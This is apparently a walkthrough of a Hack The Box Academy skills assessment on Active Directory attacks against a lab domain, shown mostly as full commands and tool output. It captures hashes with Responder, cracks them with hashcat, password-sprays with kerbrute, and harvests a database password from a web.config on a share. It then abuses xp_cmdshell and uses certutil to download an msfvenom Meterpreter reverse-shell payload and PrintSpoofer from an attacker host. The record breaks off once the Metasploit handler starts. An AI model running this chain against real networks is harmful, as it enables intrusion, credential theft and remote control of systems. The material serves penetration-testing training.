# Section 35: AD Enumeration & Attacks - Skills Assessment Part II

Module: 13. Active Directory Enumeration & Attacks

---

## Questions & Answers

### 1. Obtain a password hash for a domain user account that can be leveraged to gain a foothold in the domain. What is the account name?

Context:
- Start Responder:
```bash
┌─[✗]─[htb-student@skills-par01]─[~]
└──╼ $sudo responder -I ens224
```
- Check the result:
```bash
─[htb-student@skills-par01]─[~]
└──╼ $cat /usr/share/responder/logs/SMB-NTLMv2-SSP-172.16.7.3.txt
AB920::INLANEFREIGHT:0c6498a2a4acd121:FC356D6ADC6D88DF90AC4AE7C5A81948:010100000000000080807217BC4DD80128BCE65BE5F2DD84000000000200080036004A004500310001001E00570049004E002D00500049004D003500300048005300500046004A00530004003400570049004E002D00500049004D003500300048005300500046004A0053002E0036004A00450031002E004C004F00430041004C000300140036004A00450031002E004C004F00430041004C000500140036004A00450031002E004C004F00430041004C000700080080807217BC4DD80106000400020000000800300030000000000000000000000000200000C2EF82380450C5C35E0A85FDD7EC2C1B4D7467DB93379E10636AA575B9984C570A0010000000000000000000000000000000000009002E0063006900660073002F0049004E004C0041004E0045004600520049004700480054002E004C004F00430041004C00000000000000000000000000
```
- Emunerating the internal network:
```bash
┌─[htb-student@skills-par01]─[~]
└──╼ $fping -asgq 172.16.7.0/23
172.16.7.3
172.16.7.50
172.16.7.60
172.16.7.240

     510 targets
       4 alive
     506 unreachable
       0 unknown addresses

    2024 timeouts (waiting for response)
    2028 ICMP Echos sent
       4 ICMP Echo Replies received
    2024 other ICMP received

 0.076 ms (min round trip time)
 1.48 ms (avg round trip time)
 2.20 ms (max round trip time)
       15.158 sec (elapsed real time)

┌─[✗]─[htb-student@skills-par01]─[~]
└──╼ $vim hosts.txt
┌─[htb-student@skills-par01]─[~]
└──╼ $sudo nmap -v -A -iL hosts.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2026-08-21 02:26 EDT
<SNIP>
Nmap scan report for inlanefreight.local (172.16.7.3)
Host is up (0.0036s latency).
Not shown: 989 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-21 06:27:32Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
MAC Address: 00:50:56:8A:8F:6B (VMware)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=8/21%OT=53%CT=1%CU=36815%PV=Y%DS=1%DC=D%G=Y%M=005056%T
OS:M=6A87EFEC%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10E%TI=I%CI=I%II=I
OS:%SS=S%TS=U)OPS(O1=M5B4NW8NNS%O2=M5B4NW8NNS%O3=M5B4NW8%O4=M5B4NW8NNS%O5=M
OS:5B4NW8NNS%O6=M5B4NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70
OS:)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M5B4NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+
OS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
OS:T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A
OS:=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPC
OS:K=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:8a:8f:6b (VMware)
| Names:
|   DC01<00>             Flags: <unique><active>
|   INLANEFREIGHT<00>    Flags: <group><active>
|   INLANEFREIGHT<1c>    Flags: <group><active>
|   DC01<20>             Flags: <unique><active>
|_  INLANEFREIGHT<1b>    Flags: <unique><active>
| smb2-time: 
|   date: 2026-08-21T06:27:47
|_  start_date: N/A
|_clock-skew: -1s

TRACEROUTE
HOP RTT     ADDRESS
1   3.60 ms inlanefreight.local (172.16.7.3)

Nmap scan report for 172.16.7.50
Host is up (0.0053s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-08-21T06:27:56+00:00; +1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: MS01
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: MS01.INLANEFREIGHT.LOCAL
|   DNS_Tree_Name: INLANEFREIGHT.LOCAL
|   Product_Version: 10.0.17763
|_  System_Time: 2026-08-21T06:27:48+00:00
| ssl-cert: Subject: commonName=MS01.INLANEFREIGHT.LOCAL
| Issuer: commonName=MS01.INLANEFREIGHT.LOCAL
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-08-20T06:15:57
| Not valid after:  2027-02-19T06:15:57
| MD5:   23c1 df32 2a65 102c 202b eeb4 d2e1 81a2
|_SHA-1: 1111 1e1f 520d e716 506b e8b0 007b 762c 74ed f8c8
MAC Address: 00:50:56:8A:C7:AB (VMware)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=8/21%OT=135%CT=1%CU=41117%PV=Y%DS=1%DC=D%G=Y%M=005056%
OS:TM=6A87EFEC%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=10F%TI=I%CI=I%II=I
OS:%SS=S%TS=U)OPS(O1=M5B4NW8NNS%O2=M5B4NW8NNS%O3=M5B4NW8%O4=M5B4NW8NNS%O5=M
OS:5B4NW8NNS%O6=M5B4NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70
OS:)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M5B4NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+
OS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
OS:T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A
OS:=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPC
OS:K=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=254 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-08-21T06:27:48
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| nbstat: NetBIOS name: MS01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:8a:c7:ab (VMware)
| Names:
|   INLANEFREIGHT<00>    Flags: <group><active>
|   MS01<00>             Flags: <unique><active>
|_  MS01<20>             Flags: <unique><active>

TRACEROUTE
HOP RTT     ADDRESS
1   5.34 ms 172.16.7.50

Nmap scan report for 172.16.7.60
Host is up (0.0027s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: SQL01
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: SQL01.INLANEFREIGHT.LOCAL
|   DNS_Tree_Name: INLANEFREIGHT.LOCAL
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-08-21T06:16:06
| Not valid after:  2056-08-21T06:16:06
| MD5:   b3be 7aaf e868 96f2 9339 7f8c 0540 1f88
|_SHA-1: 0ab4 54c7 132c d27a 2cd8 c15a 2446 d647 1a38 fd64
|_ssl-date: 2026-08-21T06:27:55+00:00; 0s from scanner time.
MAC Address: 00:50:56:8A:55:4E (VMware)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=8/21%OT=135%CT=1%CU=35220%PV=Y%DS=1%DC=D%G=Y%M=005056%
OS:TM=6A87EFEC%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=107%TI=I%CI=I%II=
OS:I%SS=S%TS=U)OPS(O1=M5B4NW8NNS%O2=M5B4NW8NNS%O3=M5B4NW8%O4=M5B4NW8NNS%O5=
OS:M5B4NW8NNS%O6=M5B4NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF7
OS:0)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M5B4NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S
OS:+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=
OS:)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%
OS:A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIP
OS:CK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-08-21T06:27:48
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| nbstat: NetBIOS name: SQL01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:8a:55:4e (VMware)
| Names:
|   SQL01<00>            Flags: <unique><active>
|   INLANEFREIGHT<00>    Flags: <group><active>
|_  SQL01<20>            Flags: <unique><active>
| ms-sql-info: 
|   Windows server name: SQL01
|   172.16.7.60\SQLEXPRESS: 
|     Instance name: SQLEXPRESS
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|     TCP port: 1433
|_    Clustered: false

TRACEROUTE
HOP RTT     ADDRESS
1   2.68 ms 172.16.7.60

<SNIP>
Nmap scan report for 172.16.7.240
Host is up (0.029s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 97:cc:9f:d0:a3:84:da:d1:a2:01:58:a1:f2:71:37:e5 (RSA)
|   256 03:15:a9:1c:84:26:87:b7:5f:8d:72:73:9f:96:e0:f2 (ECDSA)
|_  256 55:c9:4a:d2:63:8b:5f:f2:ed:7b:4e:38:e1:c9:f5:71 (ED25519)
3389/tcp open  ms-wbt-server xrdp
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.2
Uptime guess: 7.991 days (since Thu Aug 13 02:40:51 2026)
Network Distance: 0 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 02:28
Completed NSE at 02:28, 0.00s elapsed
Initiating NSE at 02:28
Completed NSE at 02:28, 0.00s elapsed
Initiating NSE at 02:28
Completed NSE at 02:28, 0.00s elapsed
Post-scan script results:
| clock-skew: 
|   0s: 
|     172.16.7.60
|_    172.16.7.50
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 4 IP addresses (4 hosts up) scanned in 77.89 seconds
           Raw packets sent: 4400 (207.232KB) | Rcvd: 5242 (224.598KB)
```
- Summary:
```
172.16.7.3: DC01
172.16.7.50: MS01
172.16.7.60 SQL01
172.16.7.240: Our ParrotOS
```

**Answer:** `AB920`

---

### 2. What is this user's cleartext password?

Context:
- Crack the hash:
```
AB920::INLANEFREIGHT:0c6498a2a4acd121:FC356D6ADC6D88DF90AC4AE7C5A81948:010100000000000080807217BC4DD80128BCE65BE5F2DD84000000000200080036004A004500310001001E00570049004E002D00500049004D003500300048005300500046004A00530004003400570049004E002D00500049004D003500300048005300500046004A0053002E0036004A00450031002E004C004F00430041004C000300140036004A00450031002E004C004F00430041004C000500140036004A00450031002E004C004F00430041004C000700080080807217BC4DD80106000400020000000800300030000000000000000000000000200000C2EF82380450C5C35E0A85FDD7EC2C1B4D7467DB93379E10636AA575B9984C570A0010000000000000000000000000000000000009002E0063006900660073002F0049004E004C0041004E0045004600520049004700480054002E004C004F00430041004C00000000000000000000000000
```
```bash
┌─[eu-academy-2]─[10.10.15.191]─[htb-ac-2162140@htb-ru5kcueavg-htb-cloud-com]─[~]
└──╼ [★]$ hashcat -m 5600 -a 0 hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 2.1 LINUX) - Platform #1 [Intel(R) Corporation]
==================================================================
* Device #1: AMD EPYC-Milan Processor, 3844/7752 MB (969 MB allocatable), 4MCU

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
====================================================================================================================================================
* Device #2: cpu-haswell-AMD EPYC-Milan Processor, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

AB920::INLANEFREIGHT:0c6498a2a4acd121:fc356d6adc6d88df90ac4ae7c5a81948:010100000000000080807217bc4dd80128bce65be5f2dd84000000000200080036004a004500310001001e00570049004e002d00500049004d003500300048005300500046004a00530004003400570049004e002d00500049004d003500300048005300500046004a0053002e0036004a00450031002e004c004f00430041004c000300140036004a00450031002e004c004f00430041004c000500140036004a00450031002e004c004f00430041004c000700080080807217bc4dd80106000400020000000800300030000000000000000000000000200000c2ef82380450c5c35e0a85fdd7ec2c1b4d7467db93379e10636aa575b9984c570a0010000000000000000000000000000000000009002e0063006900660073002f0049004e004c0041004e0045004600520049004700480054002e004c004f00430041004c00000000000000000000000000:weasal
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: AB920::INLANEFREIGHT:0c6498a2a4acd121:fc356d6adc6d8...000000
Time.Started.....: Fri Aug 21 02:32:24 2026 (0 secs)
Time.Estimated...: Fri Aug 21 02:32:24 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2000.6 kH/s (0.81ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 290816/14344385 (2.03%)
Rejected.........: 0/290816 (0.00%)
Restore.Point....: 288768/14344385 (2.01%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: winers -> temyong

Started: Fri Aug 21 02:32:19 2026
Stopped: Fri Aug 21 02:32:25 2026
```

**Answer:** `weasal`

---

### 3. Submit the contents of the C:\flag.txt file on MS01.

Context:
```bash
┌─[htb-student@skills-par01]─[~]
└──╼ $evil-winrm -i 172.16.7.50 -u AB920 -p weasal

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\AB920\Documents> type C:\flag.txt
aud1t_gr0up_m3mbersh1ps!
*Evil-WinRM* PS C:\Users\AB920\Documents> 
```

**Answer:** `aud1t_gr0up_m3mbersh1ps!`

---

### 4. Use a common method to obtain weak credentials for another user. Submit the username for the user whose credentials you obtain.

Context:
- Password spraying come in place, get a valid usernames list first
```bash
sudo crackmapexec smb 172.16.7.3 -u 'ab920' -p 'weasal' --users | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,3})*)?[mGK]//g" > clean_users.txt

grep badpwdcount clean_users.txt | awk -F'\\' '{print $2}' | awk '{print $1}' | sort -u > usernames.txt
```
- Password spraying attack:
```bash
┌─[htb-student@skills-par01]─[~]
└──╼ $kerbrute passwordspray -d inlanefreight.local --dc 172.16.7.3 usernames.txt Welcome1

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 08/21/26 - Ronnie Flathers @ropnop

2026/08/21 02:43:07 >  Using KDC(s):
2026/08/21 02:43:07 >  	172.16.7.3:88

2026/08/21 02:43:08 >  [+] VALID LOGIN:	 BR086@inlanefreight.local:Welcome1
```

**Answer:** `BR086`

---

### 5. What is this user's password?


**Answer:** `Welcome1`

---

### 6. Locate a configuration file containing an MSSQL connection string. What is the password for the user listed in this file?

Context:
- SMB to DC01 to see what it has for BR086 share:
```bash
┌─[✗]─[htb-student@skills-par01]─[~]
└──╼ $smbclient -U BR086 -L \\\\172.16.7.3
Enter WORKGROUP\BR086's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Department Shares Disk      Share for department users
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
┌─[htb-student@skills-par01]─[~]
└──╼ $smbclient -U BR086 //172.16.7.3/"Department Shares"
Enter WORKGROUP\BR086's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Apr  1 11:04:01 2022
  ..                                  D        0  Fri Apr  1 11:04:01 2022
  Accounting                          D        0  Fri Apr  1 11:04:03 2022
  Executives                          D        0  Fri Apr  1 11:03:58 2022
  Finance                             D        0  Fri Apr  1 11:03:54 2022
  HR                                  D        0  Fri Apr  1 11:03:43 2022
  IT                                  D        0  Fri Apr  1 11:03:39 2022
  Marketing                           D        0  Fri Apr  1 11:03:50 2022
  R&D                                 D        0  Fri Apr  1 11:03:46 2022

		10328063 blocks of size 4096. 8143374 blocks available
smb: \> 
```
- `Department Shares` is a big disk, so use `smbmap` for more convenience:
```bash
┌─[✗]─[htb-student@skills-par01]─[~]
└──╼ $smbmap -u BR086 -p Welcome1 -d INLANEFREIGHT.LOCAL -H 172.16.7.3 -R 'Department Shares'
[+] IP: 172.16.7.3:445	Name: inlanefreight.local                               
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Department Shares                                 	READ ONLY	
	.\Department Shares\*
	dr--r--r--                0 Fri Apr  1 11:04:17 2022	.
	dr--r--r--                0 Fri Apr  1 11:04:17 2022	..
	dr--r--r--                0 Fri Apr  1 11:04:51 2022	Accounting
	dr--r--r--                0 Fri Apr  1 11:04:46 2022	Executives
	dr--r--r--                0 Fri Apr  1 11:04:41 2022	Finance
	dr--r--r--                0 Fri Apr  1 11:04:25 2022	HR
	dr--r--r--                0 Fri Apr  1 11:04:19 2022	IT
	dr--r--r--                0 Fri Apr  1 11:04:35 2022	Marketing
	dr--r--r--                0 Fri Apr  1 11:04:30 2022	R&D
	.\Department Shares\Accounting\*
	dr--r--r--                0 Fri Apr  1 11:04:51 2022	.
	dr--r--r--                0 Fri Apr  1 11:04:51 2022	..
	dr--r--r--                0 Fri Apr  1 11:05:17 2022	Private
	dr--r--r--                0 Fri Apr  1 11:04:54 2022	Public
	.\Department Shares\Executives\*
	dr--r--r--                0 Fri Apr  1 11:04:46 2022	.
	dr--r--r--                0 Fri Apr  1 11:04:46 2022	..
	dr--r--r--                0 Fri Apr  1 11:05:15 2022	Private
	dr--r--r--                0 Fri Apr  1 11:04:49 2022	Public
	.\Department Shares\Finance\*
	dr--r--r--                0 Fri Apr  1 11:04:41 2022	.
	dr--r--r--                0 Fri Apr  1 11:04:41 2022	..
	dr--r--r--                0 Fri Apr  1 11:05:12 2022	Private
	dr--r--r--                0 Fri Apr  1 11:04:43 2022	Public
	.\Department Shares\HR\*
	dr--r--r--                0 Fri Apr  1 11:04:25 2022	.
	dr--r--r--                0 Fri Apr  1 11:04:25 2022	..
	dr--r--r--                0 Fri Apr  1 11:05:04 2022	Private
	dr--r--r--                0 Fri Apr  1 11:04:27 2022	Public
	.\Department Shares\IT\*
	dr--r--r--                0 Fri Apr  1 11:04:19 2022	.
	dr--r--r--                0 Fri Apr  1 11:04:19 2022	..
	dr--r--r--                0 Fri Apr  1 11:04:56 2022	Private
	dr--r--r--                0 Fri Apr  1 11:04:22 2022	Public
	.\Department Shares\IT\Private\*
	dr--r--r--                0 Fri Apr  1 11:04:56 2022	.
	dr--r--r--                0 Fri Apr  1 11:04:56 2022	..
	dr--r--r--                0 Fri Apr  1 11:04:59 2022	Development
	.\Department Shares\IT\Private\Development\*
	dr--r--r--                0 Fri Apr  1 11:04:59 2022	.
	dr--r--r--                0 Fri Apr  1 11:04:59 2022	..
	fr--r--r--             1203 Fri Apr  1 11:05:02 2022	web.config
	.\Department Shares\Marketing\*
	dr--r--r--                0 Fri Apr  1 11:04:35 2022	.
	dr--r--r--                0 Fri Apr  1 11:04:35 2022	..
	dr--r--r--                0 Fri Apr  1 11:05:10 2022	Private
	dr--r--r--                0 Fri Apr  1 11:04:38 2022	Public
	.\Department Shares\R&D\*
	dr--r--r--                0 Fri Apr  1 11:04:30 2022	.
	dr--r--r--                0 Fri Apr  1 11:04:30 2022	..
	dr--r--r--                0 Fri Apr  1 11:05:07 2022	Private
	dr--r--r--                0 Fri Apr  1 11:04:33 2022	Public
```
- Important:
```
	.\Department Shares\IT\Private\Development\*
	dr--r--r--                0 Fri Apr  1 11:04:59 2022	.
	dr--r--r--                0 Fri Apr  1 11:04:59 2022	..
	fr--r--r--             1203 Fri Apr  1 11:05:02 2022	web.config
```
- Get the `web.config`:
```
smb: \It\Private\Development\> !cat web.config 
<?xml version="1.0" encoding="utf-8"?>

<configuration> 
    <system.web>
       <membership>
           <providers>
               <add name="WebAdminMembershipProvider" type="System.Web.Administration.WebAdminMembershipProvider" />
           </providers>
       </membership>
       <httpModules>
              <add name="WebAdminModule" type="System.Web.Administration.WebAdminModule"/>
        </httpModules>
        <authentication mode="Windows"/>
        <authorization>
              <allow users="netdb"/>
        </authorization>
        <identity impersonate="true"/>
       <trust level="Full"/>
       <pages validateRequest="true"/>
       <globalization uiCulture="auto:en-US" />
	   <masterDataServices>  
            <add key="ConnectionString" value="server=Environment.GetEnvironmentVariable("computername")+'\SQLEXPRESS;database=master;Integrated Security=SSPI;Pooling=true"/> 
       </masterDataServices>  
       <connectionStrings>
           <add name="ConString" connectionString="Environment.GetEnvironmentVariable("computername")+'\SQLEXPRESS';Initial Catalog=Northwind;User ID=netdb;Password=D@ta_bAse_adm1n!"/>
       </connectionStrings>
  </system.web>
</configuration>
```

**Answer:** `D@ta_bAse_adm1n!`

---

### 7. Submit the contents of the flag.txt file on the Administrator Desktop on the SQL01 host.

Context:
- Access SQL to the SQL01:
```bash
┌─[htb-student@skills-par01]─[~]
└──╼ $python3 /usr/local/bin/mssqlclient.py inlanefreight/netdb:'D@ta_bAse_adm1n!'@172.16.7.60
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL> SELECT IS_SRVROLEMEMBER('sysadmin');
              

-----------   

          1   

SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL> EXEC xp_cmdshell 'whoami';
output                                                                                                                                                                                                                                                            

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   

nt service\mssql$sqlexpress                                                                                                                                                                                                                                       

NULL                                                                                                                                                                                                                                                              

SQL> EXEC xp_cmdshell 'whoami /priv'
output                                                                                                                                                                                                                                                            

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   

NULL                                                                                                                                                                                                                                                              

PRIVILEGES INFORMATION                                                                                                                                                                                                                                            

----------------------                                                                                                                                                                                                                                            

NULL                                                                                                                                                                                                                                                              

Privilege Name                Description                               State                                                                                                                                                                                     

============================= ========================================= ========                                                                                                                                                                                  

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled                                                                                                                                                                                  

SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled                                                                                                                                                                                  

SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled                                                                                                                                                                                   

SeImpersonatePrivilege        Impersonate a client after authentication Enabled                                                                                                                                                                                   

SeCreateGlobalPrivilege       Create global objects                     Enabled                                                                                                                                                                                   

SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled                                                                                                                                                                                  

NULL                                                                                                                                                                                                                                                              

SQL> 
```
- PrintNightmare vulnerability is there, prepare `shell.exe` and `PrintSpoofer.exe` for the machine:
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.7.240 LPORT=1335 -f exe -o shell.exe

SQL> xp_cmdshell "certutil.exe -urlcache -f http://172.16.7.240:8000/PrintSpoofer.exe C:\Users\Public\PrintSpoofer.exe"
output                                                                             

--------------------------------------------------------------------------------   

****  Online  ****                                                                 

CertUtil: -URLCache command completed successfully.                                

NULL                                                                               

SQL> xp_cmdshell "certutil.exe -urlcache -f http://172.16.7.240:8000/shell.exe C:\Users\Public\shell.exe"
output                                                                             

--------------------------------------------------------------------------------   

****  Online  ****                                                                 

CertUtil: -URLCache command completed successfully.                                

NULL                                           
```
- Get the system privileges:
```bash
┌─[htb-student@skills-par01]─[~]
└──╼ $msfconsole -q
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 172.16.7.240
LHOST => 172.16.7.240
msf6 exploit(multi/handler) > set LPORT 1335
LPORT => 1335
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 172.16.7.240:1335 
